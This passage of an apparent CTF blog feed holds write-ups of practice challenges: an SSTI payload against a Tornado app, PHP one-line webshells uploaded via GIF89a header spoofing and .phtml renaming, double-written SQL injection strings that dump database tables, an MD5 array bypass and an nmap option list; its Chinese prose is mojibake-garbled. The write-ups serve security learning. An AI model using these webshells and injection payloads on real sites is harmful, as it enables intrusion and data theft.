class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://114.67.246.176:19230/&#x27;&#x27;&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">retuen = s.get(url)</span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>, retuen.text).group()</span><br><span class="line">result = eval(equation)</span><br><span class="line">key = &#123;<span class="string">&#x27;value&#x27;</span>:result&#125;</span><br><span class="line">print(s.post(url, data = key).text)</span><br></pre></td></tr></table></figure><p>è·‘è„šæœ¬çš„æ—¶å€™å¯èƒ½ä¸ä¼šæ¯æ¬¡éƒ½å‡ºflagï¼ˆå¯èƒ½ç»™å‡ºçš„å¼å­æº¢å‡ºæˆ–è€…ä»€ä¹ˆçš„ï¼‰ï¼Œæ²¡å‡ºå°±å¤šè·‘å‡ æ¬¡</p><p><img src="/2021/07/12/bugku3/image-20210712212923522.png" alt="image-20210712212923522"></p><p>å‚è€ƒèµ„æ–™ï¼šå…³äºå¯¹pythonè„šæœ¬çš„ç†è§£ï¼ˆä¸»è¦æ˜¯pythonè„šæœ¬ä¸‹çš„æ­£åˆ™åŒ¹é…ï¼‰ï¼š<a href="https://blog.csdn.net/weixin_43578492/article/details/101701339">https://blog.csdn.net/weixin_43578492/article/details/101701339</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘çœ‹bugkuæ–°ä¸Šäº†ä¸€æ³¢é¢˜ï¼Œå°±åšä¸€ä¸‹&lt;/p&gt;
&lt;h1 id=&quot;Game1&quot;&gt;&lt;a href=&quot;#Game1&quot; class=&quot;headerlink&quot; title=&quot;Game1&quot;&gt;&lt;/a&gt;Game1&lt;/h1&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ­æˆ¿å­çš„å°æ¸¸æˆï¼Œä¸€èˆ¬è¿™ç§é¢˜éƒ½æ˜¯é ä¿®æ”¹å¾—åˆ†æ¥</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf5</title>
    <link href="http://example.com/2021/07/11/buuctf5/"/>
    <id>http://example.com/2021/07/11/buuctf5/</id>
    <published>2021-07-11T01:35:54.000Z</published>
    <updated>2021-07-20T09:21:10.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h1><p>æ‰“å¼€å®¹å™¨å‘ç°æœ‰ä¸‰ä¸ªtxtæ–‡ä»¶:</p><p>/flag.txt<img src="/2021/07/11/buuctf5/image-20210711102359108.png" alt="image-20210711102359108">ï¼Œç”±æ­¤æˆ‘ä»¬çŒœæµ‹flagæœ€ç»ˆå¯èƒ½è—åœ¨/fllllllllllllagä¹‹ä¸‹</p><p>/welcome.txt<img src="/2021/07/11/buuctf5/image-20210711102442865.png" alt="image-20210711102442865">ï¼Œå› ä¸ºrenderæ˜¯ç”Ÿæˆæ¨¡æ¿å‡½æ•°ï¼Œæ‰€ä»¥è€ƒè™‘æ˜¯å¦å­˜åœ¨sstiæ³¨å…¥</p><p><strong>spï¼š</strong>renderå‡½æ•°çš„ä»‹ç»<code>https://blog.csdn.net/qq78827534/article/details/80792514</code></p><p>/hints.txt<img src="/2021/07/11/buuctf5/image-20210711103502285.png" alt="image-20210711103502285"></p><p>ç»“åˆURLæ çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯çŸ¥filehashçš„å€¼æ˜¯md5(cookie_secret+md5(filename))ï¼Œä¹Ÿå³æ­¤å¤„filehashçš„å€¼æ˜¯md5(cookie_secret+md5(hints))</p><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªç–‘é—®cookie_secretæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿé€šè¿‡æŸ¥é˜…å¤§ä½¬çš„åšå®¢å‘ç°<code>cookie_secret</code>åœ¨<code>Application</code>å¯¹è±¡<code>settings</code>å±æ€§ä¸­ï¼Œè¿˜å‘ç°<code>self.application.settings</code>æœ‰ä¸€ä¸ªåˆ«åã€‚<code>handler</code>æŒ‡å‘å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„<code>RequestHandler</code>å¯¹è±¡ï¼Œ<br><code> RequestHandler.settings</code>æŒ‡å‘<code>self.application.settings</code>ï¼Œ<br> å› æ­¤<code>handler.settings</code>æŒ‡å‘<code>RequestHandler.application.settings</code></p><p>çŸ¥é“äº†<code>cookie_secret</code>åœ¨å“ªäº†ï¼Œå°±è¦æƒ³ç€æ€ä¹ˆè·å–å®ƒï¼Œä¹‹å‰æåˆ°å¯èƒ½å­˜åœ¨sstiæ³¨å…¥ï¼Œ</p><p>ç°åœ¨æ¥éªŒè¯ä¸€ä¸‹ï¼Œå½“æˆ‘è¾“å…¥<code>?filename=/flag.txt&amp;filehash=&#123;&#123;1&#125;&#125;</code>ï¼š<img src="/2021/07/11/buuctf5/image-20210711110240488.png" alt="image-20210711110240488"></p><p>è¯´æ˜å­˜åœ¨sstiæ¼æ´ï¼Œè™½ç„¶å®ƒè¿‡æ»¤æ‰äº†ä¸€äº›å­—ç¬¦ï¼Œä½†æ˜¯è¿™é‡ŒError=Errorã€‚</p><p>å› æ­¤ç»“åˆå‰é¢è·å–<code>cookie_secret</code>çš„æ–¹æ³•ï¼Œ</p><p>æ„é€ payloadï¼š<code>http://e7be24f2-7da0-43fa-a090-c9e6e96f1049.node4.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p><p><img src="/2021/07/11/buuctf5/image-20210711110817583.png" alt="image-20210711110817583"></p><p>ä½¿ç”¨ä¸‹é¢è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">s1=(hashlib.md5(<span class="string">&quot;/fllllllllllllag&quot;</span>.encode())).hexdigest()</span><br><span class="line">print((hashlib.md5((<span class="string">&quot;87928a6f-e43f-4549-bc43-a101005cfb7f&quot;</span>+s1).encode())).hexdigest())</span><br></pre></td></tr></table></figure><p><img src="/2021/07/11/buuctf5/image-20210711111116510.png" alt="image-20210711111116510"></p><p>æ„é€ payloadï¼š</p><p><code>http://e7be24f2-7da0-43fa-a090-c9e6e96f1049.node4.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=61f9debba03909a86238270e8c7fb594</code><img src="/2021/07/11/buuctf5/image-20210711111239462.png" alt="image-20210711111239462"></p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>æ„Ÿè§‰å…³äºè·å–<code>cookie_secret</code>é‚£å—è¿˜æ˜¯æœ‰ç‚¹æ¨¡ç³Šï¼Œsstiä¹Ÿæ˜¯ä¸€å¤§å—çš„å†…å®¹ï¼Œæš‚æ—¶åˆå­¦äº†ä¸€ç‚¹ã€‚</p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p><p><a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">https://blog.csdn.net/weixin_45642610/article/details/112519061</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a></p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ æ¼æ´é¢˜ï¼Œå°è¯•ä¸Šä¼ webshell.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/11/buuctf5/image-20210713090617848.png" alt="image-20210713090617848"></p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªèƒ½ä¸Šä¼ å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œå°è¯•ä¸Šä¼ webshell.gifæ–‡ä»¶ç„¶åæŠ“åŒ…æ”¹ä¸ºwebshell.phtmlï¼š</p><p><img src="/2021/07/11/buuctf5/image-20210713091020061.png" alt="image-20210713091020061"></p><p>ä¿®æ”¹ä¸€å¥è¯æœ¨é©¬webshell2.gifï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>(@POST[<span class="string">&#x27;pass&#x27;</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ webshell2.gifæ–‡ä»¶ï¼š<img src="/2021/07/11/buuctf5/image-20210713091437148.png" alt="image-20210713091437148"></p><p>ä¹Ÿå°±æ˜¯ä»–å¯¹æ–‡ä»¶å¤´ä¹Ÿè¿›è¡Œäº†æ£€æŸ¥ï¼Œè¿™é‡Œå…¶å®å°±è®¾ç«‹äº†ä¸€ä¸ªè€ƒç‚¹â€”â€”å…³äºGIF89aæ–‡ä»¶å¤´æ¬ºéª—ï¼Œå®ƒå¯ä»¥ç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥ã€‚å› æ­¤å†ä¿®æ”¹ä¸€å¥è¯æœ¨é©¬webshell3.gifï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(@POST[<span class="string">&#x27;pass&#x27;</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ webshell3.gifæ–‡ä»¶ç„¶åæŠ“åŒ…æ”¹ä¸ºwebshell3.phtmlï¼Œ</p><p>ä¸Šä¼ æˆåŠŸï¼</p><p>ç„¶åç”¨èšå‰‘è¿æ¥ï¼ŒçŒœæµ‹ä¸Šä¼ è·¯å¾„æ˜¯/upload</p><p><img src="/2021/07/11/buuctf5/image-20210713092317729.png" alt="image-20210713092317729"></p><p>è¿æ¥æˆåŠŸï¼Œæ‰“å¼€è™šæ‹Ÿç»ˆç«¯ï¼Œ<code>cat /flag</code>ï¼š</p><p><img src="/2021/07/11/buuctf5/image-20210713092412953.png" alt="image-20210713092412953"></p><h1 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1><p>æ‰“å¼€å®¹å™¨ï¼Œæ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ã€‚</p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬webshell.jpgï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸ</p><p>ä¸Šä¼ webshell.jpg   æŠ“åŒ…æ”¹åç¼€webshell.php</p><p>ä¸Šä¼ å¤±è´¥</p><p>å†ä¸Šä¼ webshell.jpg   æŠ“åŒ…æ”¹åç¼€webshell.phtml</p><p>ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥ï¼Œcat /flag</p><p><img src="/2021/07/11/buuctf5/image-20210713100257941.png" alt="image-20210713100257941"></p><h5 id="æ€»ç»“ï¼š-1"><a href="#æ€»ç»“ï¼š-1" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h5><p>æ„Ÿè§‰è¿™é¢˜æ¯”ä¸Šé¢é‚£é¢˜è¿˜å®¹æ˜“ï¼Œå°±ä»…å¯¹æ–‡ä»¶ä¸Šä¼ åç¼€è¿›è¡Œäº†é™åˆ¶</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æŠ¤ç½‘æ¯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;#æŠ¤ç½‘æ¯-2018-easy-tornado&quot; class=&quot;headerlink&quot; title=&quot;[æŠ¤ç½‘æ¯ 2018]easy_tornado&quot;&gt;&lt;/a&gt;[æŠ¤ç½‘æ¯ 2018]easy_tornado</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>CTFå·¥å…·ç”¨æ³•</title>
    <link href="http://example.com/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/"/>
    <id>http://example.com/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/</id>
    <published>2021-06-06T03:16:10.000Z</published>
    <updated>2021-07-21T12:31:44.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>æŒ‡ä»¤ï¼špython dirsearch.py -uâ€127.0.0.1â€</p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>nmapå¸¸è§çš„æŒ‡ä»¤</p><p> nmap -v è¯¦ç»†ä¿¡æ¯è¾“å‡º<br> nmap -p æŒ‡å®šç«¯å£<br> nmap -iL æ‰«ææ–‡ä»¶ä¸­çš„ip<br> nmap -exclude ä¸æ‰«ææŸäº›ip<br> nmap -Pn ä½¿ç”¨pingæ‰«æï¼Œæ˜¾å¼åœ°å…³é—­ç«¯å£æ‰«æï¼Œç”¨äºä¸»æœºå‘ç°<br> nmap -sn ä½¿ç”¨pingæ‰«æï¼Œè¿›è¡Œç«¯å£æ‰«æï¼Œå‡è®¾ä¸»æœºéƒ½æ˜¯upçš„<br> nmap -sS ä½¿ç”¨SYNæ‰«æï¼Œä¸éœ€è¦å®Œæˆä¸‰æ¬¡æ¡æ‰‹<br> nmap -sT TCP connectæ‰«æï¼Œéœ€è¦å®Œæˆä¸‰æ¬¡æ¡æ‰‹ï¼Œåªé€‚ç”¨äºæ‰¾å‡ºTCPå’ŒUDPç«¯å£<br> nmap -sU æ‰«æUDPç«¯å£<br> nmap -sF FINæ‰«æï¼Œç”¨äºæ¢æµ‹é˜²ç«å¢™çŠ¶æ€ï¼Œè¯†åˆ«ç«¯å£æ˜¯å¦å…³é—­ï¼Œå®¹æ˜“æ¼æ‰«<br> nmap -sV æ‰«æç›®æ ‡ä¸»æœºçš„ç«¯å£å’Œè½¯ä»¶ç‰ˆæœ¬<br> nmap -O è¿œç¨‹æ£€æµ‹æ“ä½œç³»ç»Ÿå’Œè½¯ä»¶<br> nmap -O â€“osscan-guess çŒœæµ‹ç›®æ ‡æ“ä½œç³»ç»Ÿç‰ˆæœ¬<br> nmap -traceroute è·¯ç”±è·Ÿè¸ª<br> nmap -A ç»¼åˆæ‰«æï¼ŒåŒ…å«1-10000çš„ç«¯å£pingæ‰«æï¼Œæ“ä½œç³»ç»Ÿæ‰«æï¼Œè„šæœ¬æ‰«æï¼Œè·¯ç”±è·Ÿè¸ªï¼ŒæœåŠ¡æ¢æµ‹<br> nmap -oN result.txt å°†æ ‡å‡†è¾“å‡ºå†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ä¸­<br> nmap -oX result.xml å°†è¾“å…¥å†™æˆxmlçš„å½¢å¼<br> nmap -oS result.txt å°†è¾“å‡ºå†™æˆç‰¹æ®Šç¬¦å·çš„å½¢å¼ï¼Œå†…å®¹è·Ÿ-oNæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å­—ä½“å˜äº†è€Œå·²<br> nmap -oG result.txt å°†è¾“å‡ºå†™æˆç‰¹æ®Šæ ¼å¼<br> nmap -oA å°†è¾“å‡ºæ‰€æœ‰æ ¼å¼ï¼Œæœ‰ä¸‰ç§ .xml/ .gnmap/ .nmap<br> nmap -T[0-5] æ—¶é—´å‚æ•°æ¨¡æ¿<br>  -T0 ç”¨äºèº²é¿IDSï¼Œæ—¶é—´å¾ˆé•¿<br>  -T1 ç”¨äºèº²é¿IDSï¼Œæ—¶é—´å¾ˆé•¿<br>  -T2 é™ä½äº†æ‰«æé€Ÿåº¦ï¼Œä½¿ç”¨æ›´å°çš„å¸¦å®½å’Œç›®æ ‡ä¸»æœºèµ„æºå¯¹ç›®æ ‡é¶æœºè¿›è¡Œæ‰«æ<br>  -T3 é»˜è®¤æ¨¡å¼ï¼Œæœªåšä¼˜åŒ–<br>  -T4 å‡è®¾ç”¨æˆ·å…·æœ‰åˆé€‚åŠå¯é çš„ç½‘ç»œè€ŒåŠ é€Ÿå¯¹ç›®æ ‡é¶æœºçš„æ‰«æ<br>  -T5 å‡è®¾ç”¨æˆ·å…·æœ‰æ›´å¥½çš„ç½‘ç»œæˆ–è€…æ„¿æ„ç‰ºç‰²å‡†ç¡®æ€§è€ŒåŠ é€Ÿæ‰«æ<br> nmap -sC æ ¹æ®ç«¯å£è¯†åˆ«æœåŠ¡è‡ªåŠ¨è°ƒç”¨é»˜è®¤è„šæœ¬</p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://blog.csdn.net/haha13l4/article/details/89737637?utm_medium=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase">https://blog.csdn.net/haha13l4/article/details/89737637?utm_medium=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase</a></p><h1 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a>GitHack</h1><p>æŒ‡ä»¤ï¼š<code>GitHack.py 127.0.0.1/.git/</code></p><p><strong>å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚GitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨æµ‹è¯•è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;dirsearch&quot;&gt;&lt;a href=&quot;#dirsearch&quot; class=&quot;headerlink&quot; title=&quot;dirsearch&quot;&gt;&lt;/a&gt;dirsearch&lt;/h1&gt;&lt;p&gt;æŒ‡ä»¤ï¼špython dirsearch.py -uâ€127.0.0.1â€&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf4</title>
    <link href="http://example.com/2021/05/23/buuctf4/"/>
    <id>http://example.com/2021/05/23/buuctf4/</id>
    <published>2021-05-23T06:43:06.000Z</published>
    <updated>2021-07-11T01:24:41.485Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å…¥å¾—ç•Œé¢ï¼Œç¡®å®šæ˜¯ä¸€é“SQLæ³¨å…¥é¢˜</p><p>å…ˆç”¨ä¸‡èƒ½å¯†ç å°è¯•ä¸€ä¸‹ï¼š<img src="/buuctf4.assets/image-20210523144707563.png" alt="image-20210523144707563"></p><p>æˆ‘ä»¬çœ‹åˆ°orå¹¶æ²¡æœ‰èµ·åˆ°ä½œç”¨ï¼Œè¯´æ˜ä»–è¢«è¿‡æ»¤äº†ï¼Œå°è¯•<strong>åŒå†™</strong>ç»•è¿‡ï¼š<img src="/buuctf4.assets/image-20210523144955969.png" alt="image-20210523144955969"></p><p>æˆ‘ä»¬çœ‹åˆ°ç™»å…¥æˆåŠŸäº†ï¼Œå°è¯•unionè”åˆæ³¨å…¥ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°æœåŠ¡å™¨è¿‡æ»¤äº†union å’Œ selectï¼Œä¹Ÿå°è¯•åŒå†™ç»•è¿‡ï¼š</p><p>?username=1â€™%20 uniounionn selecselectt 1%23&amp;password=123</p><p><img src="/buuctf4.assets/image-20210523145610941.png" alt="image-20210523145610941"></p><p>æˆ‘ä»¬çœ‹åˆ°æˆåŠŸæ³¨å…¥äº†ï¼Œä½†æ˜¯åˆ—æ•°ä¸åŒ¹é…ï¼Œå¢åŠ åˆ—æ•°ï¼š<img src="/buuctf4.assets/image-20210523145912955.png" alt="image-20210523145912955"></p><h4 id="å¼€å§‹çˆ†åº“ï¼š"><a href="#å¼€å§‹çˆ†åº“ï¼š" class="headerlink" title="å¼€å§‹çˆ†åº“ï¼š"></a>å¼€å§‹çˆ†åº“ï¼š</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,database()%23&amp;password=1</code>è¿”å›çš„æ˜¯é»˜è®¤æ•°æ®åº“</p><p><img src="/buuctf4.assets/image-20210523150044941.png" alt="image-20210523150044941"></p><p>æŸ¥ä¸€ä¸‹æ‰€æœ‰æ•°æ®åº“ï¼š</p><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23&amp;password=1</code><img src="/buuctf4.assets/image-20210523163448632.png" alt="image-20210523163448632"></p><p>æ„Ÿè§‰flagå¯èƒ½è—åœ¨<code>ctf</code>æ•°æ®åº“ä¸­</p><h4 id="çˆ†è¡¨ï¼š"><a href="#çˆ†è¡¨ï¼š" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(table_name)frofromm(infoorrmation_schema.tables)whwhereere table_schema=&#39;ctf&#39; %23&amp;password=1</code></p><p><img src="/buuctf4.assets/image-20210523151431699.png" alt="image-20210523151431699"></p><h4 id="çˆ†åˆ—ï¼š"><a href="#çˆ†åˆ—ï¼š" class="headerlink" title="çˆ†åˆ—ï¼š"></a>çˆ†åˆ—ï¼š</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frofromm (infoorrmation_schema.columns) wherwheree table_name=&quot;Flag&quot;%23&amp;password=1</code></p><p><img src="/buuctf4.assets/image-20210523164546430.png" alt="image-20210523164546430"></p><h4 id="çˆ†å€¼ï¼š"><a href="#çˆ†å€¼ï¼š" class="headerlink" title="çˆ†å€¼ï¼š"></a>çˆ†å€¼ï¼š</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(flag) frofromm (ctf.Flag)%23&amp;password=1</code></p><p><img src="/buuctf4.assets/image-20210523170907245.png" alt="image-20210523170907245"></p><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>æ‰“å¼€å®¹å™¨å‘ç°ä¸€æ®µphpä»£ç ï¼Œæ•´ç†å¾—ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡å¯çŸ¥ï¼Œæˆ‘ä»¬é€šè¿‡GETè·å–ggå’Œidä¸¤ä¸ªå‚æ•°ï¼Œé€šè¿‡POSTè·å–passwdã€‚</p><p>å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼šif(  md5($id) === md5($gg) &amp;&amp; $id !== $gg )</p><p>å®ƒè¦æ±‚æˆ‘ä»¬ä¸¤ç»„å‚æ•°çš„å€¼è¦ä¸ç›¸ç­‰ï¼Œä½†md5ç¼–ç åçš„å€¼ç›¸ç­‰</p><p>æˆ‘ä»¬ä¹‹å‰æœ‰åšè¿‡md5ç»•è¿‡ï¼Œå¼±ç­‰äºåˆ¤æ–­ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡md5ã€‚å› ä¸ºmd5æ— æ³•ç¼–ç æ•°ç»„ï¼Œä¼šè¿”å›nullã€‚</p><p>æ„é€ ç¬¬ä¸€ä¸ªpayloadï¼š<code>?id[]=1&amp;gg[]=2</code></p><p>å†çœ‹ç¬¬äºŒä¸ªåˆ¤æ–­è¯­å¥ï¼šif (   !is_numeric($passwd)    )<br>                                               if(     $passwd==1234567    